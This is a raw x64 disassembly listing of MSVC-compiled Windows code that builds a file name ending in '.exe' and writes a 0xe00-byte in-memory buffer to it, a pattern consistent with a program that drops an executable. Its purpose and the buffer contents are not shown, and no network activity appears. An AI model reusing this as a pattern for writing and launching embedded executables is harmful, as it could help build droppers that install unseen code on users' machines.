   1400047e5:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   1400047ea:	45 33 c9             	xor    %r9d,%r9d
   1400047ed:	45 33 c0             	xor    %r8d,%r8d
   1400047f0:	33 d2                	xor    %edx,%edx
   1400047f2:	33 c9                	xor    %ecx,%ecx
   1400047f4:	ff 15 56 6b 00 00    	call   *0x6b56(%rip)        # 0x14000b350
   1400047fa:	cc                   	int3
   1400047fb:	e8 9c 42 00 00       	call   0x140008a9c
   140004800:	90                   	nop
   140004801:	f6 c3 01             	test   $0x1,%bl
   140004804:	74 51                	je     0x140004857
   140004806:	83 e3 fe             	and    $0xfffffffe,%ebx
   140004809:	48 8b 55 90          	mov    -0x70(%rbp),%rdx
   14000480d:	48 83 fa 0f          	cmp    $0xf,%rdx
   140004811:	76 44                	jbe    0x140004857
   140004813:	48 ff c2             	inc    %rdx
   140004816:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   14000481b:	48 8b c1             	mov    %rcx,%rax
   14000481e:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140004825:	72 2b                	jb     0x140004852
   140004827:	48 83 c2 27          	add    $0x27,%rdx
   14000482b:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   14000482f:	48 2b c1             	sub    %rcx,%rax
   140004832:	48 83 e8 08          	sub    $0x8,%rax
   140004836:	48 83 f8 1f          	cmp    $0x1f,%rax
   14000483a:	76 16                	jbe    0x140004852
   14000483c:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   140004841:	45 33 c9             	xor    %r9d,%r9d
   140004844:	45 33 c0             	xor    %r8d,%r8d
   140004847:	33 d2                	xor    %edx,%edx
   140004849:	33 c9                	xor    %ecx,%ecx
   14000484b:	ff 15 ff 6a 00 00    	call   *0x6aff(%rip)        # 0x14000b350
   140004851:	cc                   	int3
   140004852:	e8 45 42 00 00       	call   0x140008a9c
   140004857:	33 d2                	xor    %edx,%edx
   140004859:	41 b8 e8 00 00 00    	mov    $0xe8,%r8d
   14000485f:	48 8d 8d 00 01 00 00 	lea    0x100(%rbp),%rcx
   140004866:	e8 1a 4f 00 00       	call   0x140009785
   14000486b:	48 8d 05 6e a2 00 00 	lea    0xa26e(%rip),%rax        # 0x14000eae0
   140004872:	48 89 85 00 01 00 00 	mov    %rax,0x100(%rbp)
   140004879:	48 8d 8d 88 01 00 00 	lea    0x188(%rbp),%rcx
   140004880:	ff 15 6a 68 00 00    	call   *0x686a(%rip)        # 0x14000b0f0
   140004886:	90                   	nop
   140004887:	83 cb 04             	or     $0x4,%ebx
   14000488a:	89 5c 24 50          	mov    %ebx,0x50(%rsp)
   14000488e:	45 33 c9             	xor    %r9d,%r9d
   140004891:	45 33 c0             	xor    %r8d,%r8d
   140004894:	48 8d 95 08 01 00 00 	lea    0x108(%rbp),%rdx
   14000489b:	48 8d 8d 00 01 00 00 	lea    0x100(%rbp),%rcx
   1400048a2:	ff 15 60 68 00 00    	call   *0x6860(%rip)        # 0x14000b108
   1400048a8:	90                   	nop
   1400048a9:	48 8b 85 00 01 00 00 	mov    0x100(%rbp),%rax
   1400048b0:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400048b4:	48 8d 05 ed a0 00 00 	lea    0xa0ed(%rip),%rax        # 0x14000e9a8
   1400048bb:	48 89 84 0d 00 01 00 	mov    %rax,0x100(%rbp,%rcx,1)
   1400048c2:	00 
   1400048c3:	48 8b 85 00 01 00 00 	mov    0x100(%rbp),%rax
   1400048ca:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400048ce:	8d 91 78 ff ff ff    	lea    -0x88(%rcx),%edx
   1400048d4:	89 94 0d fc 00 00 00 	mov    %edx,0xfc(%rbp,%rcx,1)
   1400048db:	48 8d 8d 08 01 00 00 	lea    0x108(%rbp),%rcx
   1400048e2:	ff 15 20 69 00 00    	call   *0x6920(%rip)        # 0x14000b208
   1400048e8:	48 8d 05 79 a1 00 00 	lea    0xa179(%rip),%rax        # 0x14000ea68
   1400048ef:	48 89 85 08 01 00 00 	mov    %rax,0x108(%rbp)
   1400048f6:	4c 89 ad 70 01 00 00 	mov    %r13,0x170(%rbp)
   1400048fd:	c7 85 78 01 00 00 04 	movl   $0x4,0x178(%rbp)
   140004904:	00 00 00 
   140004907:	48 8d 8d 00 01 00 00 	lea    0x100(%rbp),%rcx
   14000490e:	e8 fd 18 00 00       	call   0x140006210
   140004913:	48 8b c8             	mov    %rax,%rcx
   140004916:	48 8d 15 b3 ce ff ff 	lea    -0x314d(%rip),%rdx        # 0x1400017d0
   14000491d:	ff 15 5d 68 00 00    	call   *0x685d(%rip)        # 0x14000b180
   140004923:	48 8b c8             	mov    %rax,%rcx
   140004926:	48 8d 15 c3 ce ff ff 	lea    -0x313d(%rip),%rdx        # 0x1400017f0
   14000492d:	ff 15 4d 68 00 00    	call   *0x684d(%rip)        # 0x14000b180
   140004933:	48 8b c8             	mov    %rax,%rcx
   140004936:	41 8b d7             	mov    %r15d,%edx
   140004939:	ff 15 49 68 00 00    	call   *0x6849(%rip)        # 0x14000b188
   14000493f:	90                   	nop
   140004940:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004943:	0f 11 44 24 58       	movups %xmm0,0x58(%rsp)
   140004948:	4c 89 6c 24 68       	mov    %r13,0x68(%rsp)
   14000494d:	ba 0f 00 00 00       	mov    $0xf,%edx
   140004952:	48 89 54 24 70       	mov    %rdx,0x70(%rsp)
   140004957:	c6 44 24 58 00       	movb   $0x0,0x58(%rsp)
   14000495c:	83 cb 10             	or     $0x10,%ebx
   14000495f:	89 5c 24 50          	mov    %ebx,0x50(%rsp)
   140004963:	8b 8d 78 01 00 00    	mov    0x178(%rbp),%ecx
   140004969:	f6 c1 02             	test   $0x2,%cl
   14000496c:	74 05                	je     0x140004973
   14000496e:	f6 c1 20             	test   $0x20,%cl
   140004971:	74 2d                	je     0x1400049a0
   140004973:	48 8b 85 48 01 00 00 	mov    0x148(%rbp),%rax
   14000497a:	48 8b 18             	mov    (%rax),%rbx
   14000497d:	48 85 db             	test   %rbx,%rbx
   140004980:	74 1e                	je     0x1400049a0
   140004982:	48 8b 85 28 01 00 00 	mov    0x128(%rbp),%rax
   140004989:	4c 8b 08             	mov    (%rax),%r9
   14000498c:	48 3b 9d 70 01 00 00 	cmp    0x170(%rbp),%rbx
   140004993:	48 0f 42 9d 70 01 00 	cmovb  0x170(%rbp),%rbx
   14000499a:	00 
   14000499b:	49 2b d9             	sub    %r9,%rbx
   14000499e:	eb 2e                	jmp    0x1400049ce
   1400049a0:	f6 c1 04             	test   $0x4,%cl
   1400049a3:	75 5c                	jne    0x140004a01
   1400049a5:	48 8b 85 40 01 00 00 	mov    0x140(%rbp),%rax
   1400049ac:	48 8b 08             	mov    (%rax),%rcx
   1400049af:	48 85 c9             	test   %rcx,%rcx
   1400049b2:	74 4d                	je     0x140004a01
   1400049b4:	48 8b 85 20 01 00 00 	mov    0x120(%rbp),%rax
   1400049bb:	4c 8b 08             	mov    (%rax),%r9
   1400049be:	48 8b 85 58 01 00 00 	mov    0x158(%rbp),%rax
   1400049c5:	48 63 18             	movslq (%rax),%rbx
   1400049c8:	49 2b d9             	sub    %r9,%rbx
   1400049cb:	48 03 d9             	add    %rcx,%rbx
   1400049ce:	4d 85 c9             	test   %r9,%r9
   1400049d1:	74 2e                	je     0x140004a01
   1400049d3:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   1400049d8:	48 3b da             	cmp    %rdx,%rbx
   1400049db:	77 17                	ja     0x1400049f4
   1400049dd:	48 89 5c 24 68       	mov    %rbx,0x68(%rsp)
   1400049e2:	4c 8b c3             	mov    %rbx,%r8
   1400049e5:	49 8b d1             	mov    %r9,%rdx
   1400049e8:	e8 42 4f 00 00       	call   0x14000992f
   1400049ed:	c6 44 1c 58 00       	movb   $0x0,0x58(%rsp,%rbx,1)
   1400049f2:	eb 08                	jmp    0x1400049fc
   1400049f4:	48 8b d3             	mov    %rbx,%rdx
   1400049f7:	e8 94 3c 00 00       	call   0x140008690
   1400049fc:	48 8b 54 24 70       	mov    0x70(%rsp),%rdx
   140004a01:	48 8d b5 e0 00 00 00 	lea    0xe0(%rbp),%rsi
   140004a08:	66 48 0f 7e f9       	movq   %xmm7,%rcx
   140004a0d:	66 0f 6f c6          	movdqa %xmm6,%xmm0
   140004a11:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   140004a16:	66 48 0f 7e c0       	movq   %xmm0,%rax
   140004a1b:	48 83 f8 0f          	cmp    $0xf,%rax
   140004a1f:	48 0f 47 f1          	cmova  %rcx,%rsi
   140004a23:	66 49 0f 7e f6       	movq   %xmm6,%r14
   140004a28:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
   140004a2d:	48 8b c2             	mov    %rdx,%rax
   140004a30:	49 2b c0             	sub    %r8,%rax
   140004a33:	4c 3b f0             	cmp    %rax,%r14
   140004a36:	77 79                	ja     0x140004ab1
   140004a38:	4b 8d 04 06          	lea    (%r14,%r8,1),%rax
   140004a3c:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   140004a41:	48 8d 5c 24 58       	lea    0x58(%rsp),%rbx
   140004a46:	48 83 fa 0f          	cmp    $0xf,%rdx
   140004a4a:	48 0f 47 5c 24 58    	cmova  0x58(%rsp),%rbx
   140004a50:	49 8d 04 36          	lea    (%r14,%rsi,1),%rax
   140004a54:	48 3b c3             	cmp    %rbx,%rax
   140004a57:	76 1b                	jbe    0x140004a74
   140004a59:	49 8d 04 18          	lea    (%r8,%rbx,1),%rax
   140004a5d:	48 3b f0             	cmp    %rax,%rsi
   140004a60:	77 12                	ja     0x140004a74
   140004a62:	48 3b de             	cmp    %rsi,%rbx
   140004a65:	77 05                	ja     0x140004a6c
   140004a67:	4d 8b fd             	mov    %r13,%r15
   140004a6a:	eb 0b                	jmp    0x140004a77
   140004a6c:	4c 8b fb             	mov    %rbx,%r15
   140004a6f:	4c 2b fe             	sub    %rsi,%r15
   140004a72:	eb 03                	jmp    0x140004a77
   140004a74:	4d 8b fe             	mov    %r14,%r15
   140004a77:	49 ff c0             	inc    %r8
   140004a7a:	49 8d 0c 1e          	lea    (%r14,%rbx,1),%rcx
   140004a7e:	48 8b d3             	mov    %rbx,%rdx
   140004a81:	e8 a9 4e 00 00       	call   0x14000992f
   140004a86:	4d 8b c7             	mov    %r15,%r8
   140004a89:	48 8b d6             	mov    %rsi,%rdx
   140004a8c:	48 8b cb             	mov    %rbx,%rcx
   140004a8f:	e8 f7 4c 00 00       	call   0x14000978b
   140004a94:	4d 8b c6             	mov    %r14,%r8
   140004a97:	4d 2b c7             	sub    %r15,%r8
   140004a9a:	4b 8d 14 3e          	lea    (%r14,%r15,1),%rdx
   140004a9e:	48 03 d6             	add    %rsi,%rdx
   140004aa1:	4a 8d 0c 3b          	lea    (%rbx,%r15,1),%rcx
   140004aa5:	e8 e1 4c 00 00       	call   0x14000978b
   140004aaa:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   140004aaf:	eb 17                	jmp    0x140004ac8
   140004ab1:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   140004ab6:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140004abb:	49 8b d6             	mov    %r14,%rdx
   140004abe:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140004ac3:	e8 38 3a 00 00       	call   0x140008500
   140004ac8:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004acb:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   140004ad0:	0f 57 c9             	xorps  %xmm1,%xmm1
   140004ad3:	f3 0f 7f 4c 24 40    	movdqu %xmm1,0x40(%rsp)
   140004ad9:	0f 10 00             	movups (%rax),%xmm0
   140004adc:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   140004ae1:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140004ae5:	0f 11 4c 24 40       	movups %xmm1,0x40(%rsp)
   140004aea:	4c 89 68 10          	mov    %r13,0x10(%rax)
   140004aee:	48 c7 40 18 0f 00 00 	movq   $0xf,0x18(%rax)
   140004af5:	00 
   140004af6:	c6 00 00             	movb   $0x0,(%rax)
   140004af9:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140004afe:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140004b03:	48 8b c2             	mov    %rdx,%rax
   140004b06:	48 2b c1             	sub    %rcx,%rax
   140004b09:	48 83 f8 04          	cmp    $0x4,%rax
   140004b0d:	72 2b                	jb     0x140004b3a
   140004b0f:	48 8d 41 04          	lea    0x4(%rcx),%rax
   140004b13:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140004b18:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140004b1d:	48 83 fa 0f          	cmp    $0xf,%rdx
   140004b21:	48 0f 47 44 24 30    	cmova  0x30(%rsp),%rax
   140004b27:	c7 04 01 2e 65 78 65 	movl   $0x6578652e,(%rcx,%rax,1)
   140004b2e:	c6 44 01 04 00       	movb   $0x0,0x4(%rcx,%rax,1)
   140004b33:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140004b38:	eb 18                	jmp    0x140004b52
   140004b3a:	48 c7 44 24 20 04 00 	movq   $0x4,0x20(%rsp)
   140004b41:	00 00 
   140004b43:	ba 04 00 00 00       	mov    $0x4,%edx
   140004b48:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140004b4d:	e8 ce 37 00 00       	call   0x140008320
   140004b52:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004b55:	0f 11 85 c0 00 00 00 	movups %xmm0,0xc0(%rbp)
   140004b5c:	0f 57 c9             	xorps  %xmm1,%xmm1
   140004b5f:	f3 0f 7f 8d d0 00 00 	movdqu %xmm1,0xd0(%rbp)
   140004b66:	00 
   140004b67:	0f 10 00             	movups (%rax),%xmm0
   140004b6a:	0f 11 85 c0 00 00 00 	movups %xmm0,0xc0(%rbp)
   140004b71:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140004b75:	0f 11 8d d0 00 00 00 	movups %xmm1,0xd0(%rbp)
   140004b7c:	4c 89 68 10          	mov    %r13,0x10(%rax)
   140004b80:	48 c7 40 18 0f 00 00 	movq   $0xf,0x18(%rax)
   140004b87:	00 
   140004b88:	c6 00 00             	movb   $0x0,(%rax)
   140004b8b:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140004b90:	48 83 fa 0f          	cmp    $0xf,%rdx
   140004b94:	76 44                	jbe    0x140004bda
   140004b96:	48 ff c2             	inc    %rdx
   140004b99:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140004b9e:	48 8b c1             	mov    %rcx,%rax
   140004ba1:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140004ba8:	72 2b                	jb     0x140004bd5
   140004baa:	48 83 c2 27          	add    $0x27,%rdx
   140004bae:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140004bb2:	48 2b c1             	sub    %rcx,%rax
   140004bb5:	48 83 e8 08          	sub    $0x8,%rax
   140004bb9:	48 83 f8 1f          	cmp    $0x1f,%rax
   140004bbd:	76 16                	jbe    0x140004bd5
   140004bbf:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   140004bc4:	45 33 c9             	xor    %r9d,%r9d
   140004bc7:	45 33 c0             	xor    %r8d,%r8d
   140004bca:	33 d2                	xor    %edx,%edx
   140004bcc:	33 c9                	xor    %ecx,%ecx
   140004bce:	ff 15 7c 67 00 00    	call   *0x677c(%rip)        # 0x14000b350
   140004bd4:	cc                   	int3
   140004bd5:	e8 c2 3e 00 00       	call   0x140008a9c
   140004bda:	66 0f 6f 05 0e 9f 00 	movdqa 0x9f0e(%rip),%xmm0        # 0x14000eaf0
   140004be1:	00 
   140004be2:	f3 0f 7f 44 24 40    	movdqu %xmm0,0x40(%rsp)
   140004be8:	c6 44 24 30 00       	movb   $0x0,0x30(%rsp)
   140004bed:	48 8b 54 24 70       	mov    0x70(%rsp),%rdx
   140004bf2:	48 83 fa 0f          	cmp    $0xf,%rdx
   140004bf6:	76 44                	jbe    0x140004c3c
   140004bf8:	48 ff c2             	inc    %rdx
   140004bfb:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140004c00:	48 8b c1             	mov    %rcx,%rax
   140004c03:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140004c0a:	72 2b                	jb     0x140004c37
   140004c0c:	48 83 c2 27          	add    $0x27,%rdx
   140004c10:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140004c14:	48 2b c1             	sub    %rcx,%rax
   140004c17:	48 83 e8 08          	sub    $0x8,%rax
   140004c1b:	48 83 f8 1f          	cmp    $0x1f,%rax
   140004c1f:	76 16                	jbe    0x140004c37
   140004c21:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   140004c26:	45 33 c9             	xor    %r9d,%r9d
   140004c29:	45 33 c0             	xor    %r8d,%r8d
   140004c2c:	33 d2                	xor    %edx,%edx
   140004c2e:	33 c9                	xor    %ecx,%ecx
   140004c30:	ff 15 1a 67 00 00    	call   *0x671a(%rip)        # 0x14000b350
   140004c36:	cc                   	int3
   140004c37:	e8 60 3e 00 00       	call   0x140008a9c
   140004c3c:	4c 89 6c 24 68       	mov    %r13,0x68(%rsp)
   140004c41:	48 c7 44 24 70 0f 00 	movq   $0xf,0x70(%rsp)
   140004c48:	00 00 
   140004c4a:	c6 44 24 58 00       	movb   $0x0,0x58(%rsp)
   140004c4f:	33 d2                	xor    %edx,%edx
   140004c51:	41 b8 08 01 00 00    	mov    $0x108,%r8d
   140004c57:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   140004c5b:	e8 25 4b 00 00       	call   0x140009785
   140004c60:	48 8d 95 c0 00 00 00 	lea    0xc0(%rbp),%rdx
   140004c67:	48 83 bd d8 00 00 00 	cmpq   $0xf,0xd8(%rbp)
   140004c6e:	0f 
   140004c6f:	48 0f 47 95 c0 00 00 	cmova  0xc0(%rbp),%rdx
   140004c76:	00 
   140004c77:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   140004c7b:	e8 60 31 00 00       	call   0x140007de0
   140004c80:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
   140004c84:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140004c88:	48 8d 05 a9 9d 00 00 	lea    0x9da9(%rip),%rax        # 0x14000ea38
   140004c8f:	48 89 44 0d b0       	mov    %rax,-0x50(%rbp,%rcx,1)
   140004c94:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
   140004c98:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140004c9c:	44 8d 81 58 ff ff ff 	lea    -0xa8(%rcx),%r8d
   140004ca3:	44 89 44 0d ac       	mov    %r8d,-0x54(%rbp,%rcx,1)
   140004ca8:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
   140004cac:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140004cb0:	48 8d 45 b0          	lea    -0x50(%rbp),%rax
   140004cb4:	48 03 c8             	add    %rax,%rcx
   140004cb7:	ff 15 e3 64 00 00    	call   *0x64e3(%rip)        # 0x14000b1a0
   140004cbd:	84 c0                	test   %al,%al
   140004cbf:	74 3f                	je     0x140004d00
   140004cc1:	41 b8 00 0e 00 00    	mov    $0xe00,%r8d
   140004cc7:	49 8b d4             	mov    %r12,%rdx
   140004cca:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   140004cce:	ff 15 bc 64 00 00    	call   *0x64bc(%rip)        # 0x14000b190
   140004cd4:	48 8d 4d b8          	lea    -0x48(%rbp),%rcx
   140004cd8:	e8 03 34 00 00       	call   0x1400080e0
   140004cdd:	48 85 c0             	test   %rax,%rax
   140004ce0:	75 1e                	jne    0x140004d00
   140004ce2:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
   140004ce6:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140004cea:	48 8d 45 b0          	lea    -0x50(%rbp),%rax
   140004cee:	48 03 c8             	add    %rax,%rcx
   140004cf1:	45 33 c0             	xor    %r8d,%r8d
   140004cf4:	ba 02 00 00 00       	mov    $0x2,%edx
   140004cf9:	ff 15 e9 63 00 00    	call   *0x63e9(%rip)        # 0x14000b0e8
   140004cff:	90                   	nop
   140004d00:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   140004d04:	e8 17 02 00 00       	call   0x140004f20
   140004d09:	90                   	nop
   140004d0a:	48 8b 95 d8 00 00 00 	mov    0xd8(%rbp),%rdx
   140004d11:	48 83 fa 0f          	cmp    $0xf,%rdx
   140004d15:	76 46                	jbe    0x140004d5d
   140004d17:	48 ff c2             	inc    %rdx
   140004d1a:	48 8b 8d c0 00 00 00 	mov    0xc0(%rbp),%rcx
   140004d21:	48 8b c1             	mov    %rcx,%rax
   140004d24:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140004d2b:	72 2b                	jb     0x140004d58
   140004d2d:	48 83 c2 27          	add    $0x27,%rdx
   140004d31:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140004d35:	48 2b c1             	sub    %rcx,%rax
   140004d38:	48 83 e8 08          	sub    $0x8,%rax
   140004d3c:	48 83 f8 1f          	cmp    $0x1f,%rax
   140004d40:	76 16                	jbe    0x140004d58
   140004d42:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   140004d47:	45 33 c9             	xor    %r9d,%r9d
   140004d4a:	45 33 c0             	xor    %r8d,%r8d
   140004d4d:	33 d2                	xor    %edx,%edx
   140004d4f:	33 c9                	xor    %ecx,%ecx
   140004d51:	ff 15 f9 65 00 00    	call   *0x65f9(%rip)        # 0x14000b350
   140004d57:	cc                   	int3
   140004d58:	e8 3f 3d 00 00       	call   0x140008a9c
   140004d5d:	66 0f 6f 05 8b 9d 00 	movdqa 0x9d8b(%rip),%xmm0        # 0x14000eaf0
   140004d64:	00 
   140004d65:	f3 0f 7f 85 d0 00 00 	movdqu %xmm0,0xd0(%rbp)
   140004d6c:	00 
   140004d6d:	c6 85 c0 00 00 00 00 	movb   $0x0,0xc0(%rbp)
   140004d74:	48 8b 85 00 01 00 00 	mov    0x100(%rbp),%rax
   140004d7b:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140004d7f:	48 8d 05 22 9c 00 00 	lea    0x9c22(%rip),%rax        # 0x14000e9a8
   140004d86:	48 89 84 0d 00 01 00 	mov    %rax,0x100(%rbp,%rcx,1)
   140004d8d:	00 
   140004d8e:	48 8b 85 00 01 00 00 	mov    0x100(%rbp),%rax
   140004d95:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140004d99:	8d 91 78 ff ff ff    	lea    -0x88(%rcx),%edx
   140004d9f:	89 94 0d fc 00 00 00 	mov    %edx,0xfc(%rbp,%rcx,1)
   140004da6:	48 8d 8d 08 01 00 00 	lea    0x108(%rbp),%rcx
   140004dad:	e8 be 29 00 00       	call   0x140007770
   140004db2:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   140004db9:	ff 15 b9 63 00 00    	call   *0x63b9(%rip)        # 0x14000b178
   140004dbf:	48 8d 8d 88 01 00 00 	lea    0x188(%rbp),%rcx
   140004dc6:	ff 15 44 64 00 00    	call   *0x6444(%rip)        # 0x14000b210
   140004dcc:	90                   	nop
   140004dcd:	48 8b 95 f8 00 00 00 	mov    0xf8(%rbp),%rdx
   140004dd4:	48 83 fa 0f          	cmp    $0xf,%rdx
   140004dd8:	76 47                	jbe    0x140004e21
   140004dda:	48 ff c2             	inc    %rdx
   140004ddd:	48 8b 8d e0 00 00 00 	mov    0xe0(%rbp),%rcx
   140004de4:	48 8b c1             	mov    %rcx,%rax
   140004de7:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140004dee:	72 2b                	jb     0x140004e1b
   140004df0:	48 83 c2 27          	add    $0x27,%rdx
   140004df4:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140004df8:	48 2b c1             	sub    %rcx,%rax
   140004dfb:	48 83 e8 08          	sub    $0x8,%rax
   140004dff:	48 83 f8 1f          	cmp    $0x1f,%rax
   140004e03:	76 16                	jbe    0x140004e1b
   140004e05:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   140004e0a:	45 33 c9             	xor    %r9d,%r9d
   140004e0d:	45 33 c0             	xor    %r8d,%r8d
   140004e10:	33 d2                	xor    %edx,%edx
   140004e12:	33 c9                	xor    %ecx,%ecx
   140004e14:	ff 15 36 65 00 00    	call   *0x6536(%rip)        # 0x14000b350
   140004e1a:	cc                   	int3
   140004e1b:	e8 7c 3c 00 00       	call   0x140008a9c
   140004e20:	90                   	nop
   140004e21:	48 8b 57 18          	mov    0x18(%rdi),%rdx
   140004e25:	48 83 fa 0f          	cmp    $0xf,%rdx
   140004e29:	76 2c                	jbe    0x140004e57
   140004e2b:	48 ff c2             	inc    %rdx
   140004e2e:	48 8b 0f             	mov    (%rdi),%rcx
   140004e31:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140004e38:	72 18                	jb     0x140004e52
   140004e3a:	48 83 c2 27          	add    $0x27,%rdx
   140004e3e:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140004e42:	48 2b c8             	sub    %rax,%rcx
   140004e45:	48 83 e9 08          	sub    $0x8,%rcx
   140004e49:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140004e4d:	77 4b                	ja     0x140004e9a
   140004e4f:	48 8b c8             	mov    %rax,%rcx
   140004e52:	e8 45 3c 00 00       	call   0x140008a9c
   140004e57:	4c 89 6f 10          	mov    %r13,0x10(%rdi)
   140004e5b:	48 c7 47 18 0f 00 00 	movq   $0xf,0x18(%rdi)
   140004e62:	00 
   140004e63:	c6 07 00             	movb   $0x0,(%rdi)
   140004e66:	48 8b 8d f0 01 00 00 	mov    0x1f0(%rbp),%rcx
   140004e6d:	48 33 cc             	xor    %rsp,%rcx
   140004e70:	e8 8b 39 00 00       	call   0x140008800
   140004e75:	4c 8d 9c 24 20 03 00 	lea    0x320(%rsp),%r11
   140004e7c:	00 
   140004e7d:	49 8b 5b 50          	mov    0x50(%r11),%rbx
   140004e81:	41 0f 28 73 f0       	movaps -0x10(%r11),%xmm6
   140004e86:	41 0f 28 7b e0       	movaps -0x20(%r11),%xmm7
   140004e8b:	49 8b e3             	mov    %r11,%rsp
   140004e8e:	41 5f                	pop    %r15
   140004e90:	41 5e                	pop    %r14
   140004e92:	41 5d                	pop    %r13
   140004e94:	41 5c                	pop    %r12
   140004e96:	5f                   	pop    %rdi
   140004e97:	5e                   	pop    %rsi
   140004e98:	5d                   	pop    %rbp
   140004e99:	c3                   	ret
   140004e9a:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   140004e9f:	45 33 c9             	xor    %r9d,%r9d
   140004ea2:	45 33 c0             	xor    %r8d,%r8d
   140004ea5:	33 d2                	xor    %edx,%edx
   140004ea7:	33 c9                	xor    %ecx,%ecx
   140004ea9:	ff 15 a1 64 00 00    	call   *0x64a1(%rip)        # 0x14000b350
   140004eaf:	90                   	nop
   140004eb0:	e8 2b c8 ff ff       	call   0x1400016e0
   140004eb5:	90                   	nop
   140004eb6:	e8 85 c7 ff ff       	call   0x140001640
   140004ebb:	cc                   	int3
   140004ebc:	cc                   	int3
   140004ebd:	cc                   	int3
   140004ebe:	cc                   	int3
   140004ebf:	cc                   	int3
   140004ec0:	40 53                	rex push %rbx
   140004ec2:	48 83 ec 20          	sub    $0x20,%rsp
   140004ec6:	48 8b 01             	mov    (%rcx),%rax
   140004ec9:	48 8d 99 88 00 00 00 	lea    0x88(%rcx),%rbx
   140004ed0:	48 63 50 04          	movslq 0x4(%rax),%rdx
   140004ed4:	48 8d 05 cd 9a 00 00 	lea    0x9acd(%rip),%rax        # 0x14000e9a8
   140004edb:	48 89 84 1a 78 ff ff 	mov    %rax,-0x88(%rdx,%rbx,1)
   140004ee2:	ff 
   140004ee3:	48 8b 01             	mov    (%rcx),%rax
   140004ee6:	48 83 c1 08          	add    $0x8,%rcx
   140004eea:	48 63 50 04          	movslq 0x4(%rax),%rdx
   140004eee:	44 8d 82 78 ff ff ff 	lea    -0x88(%rdx),%r8d
   140004ef5:	44 89 84 1a 74 ff ff 	mov    %r8d,-0x8c(%rdx,%rbx,1)
   140004efc:	ff 
   140004efd:	e8 6e 28 00 00       	call   0x140007770
   140004f02:	48 8d 4b 88          	lea    -0x78(%rbx),%rcx
   140004f06:	ff 15 6c 62 00 00    	call   *0x626c(%rip)        # 0x14000b178
   140004f0c:	48 8b cb             	mov    %rbx,%rcx
   140004f0f:	48 83 c4 20          	add    $0x20,%rsp
   140004f13:	5b                   	pop    %rbx
   140004f14:	48 ff 25 f5 62 00 00 	rex.W jmp *0x62f5(%rip)        # 0x14000b210
   140004f1b:	cc                   	int3
   140004f1c:	cc                   	int3
   140004f1d:	cc                   	int3
   140004f1e:	cc                   	int3
   140004f1f:	cc                   	int3
   140004f20:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004f25:	57                   	push   %rdi
   140004f26:	48 83 ec 20          	sub    $0x20,%rsp
   140004f2a:	48 8d b9 a8 00 00 00 	lea    0xa8(%rcx),%rdi
   140004f31:	48 8b 01             	mov    (%rcx),%rax
   140004f34:	48 63 50 04          	movslq 0x4(%rax),%rdx
   140004f38:	48 8d 05 f9 9a 00 00 	lea    0x9af9(%rip),%rax        # 0x14000ea38
   140004f3f:	48 89 84 3a 58 ff ff 	mov    %rax,-0xa8(%rdx,%rdi,1)
   140004f46:	ff 
   140004f47:	48 8b 01             	mov    (%rcx),%rax
   140004f4a:	48 63 48 04          	movslq 0x4(%rax),%rcx
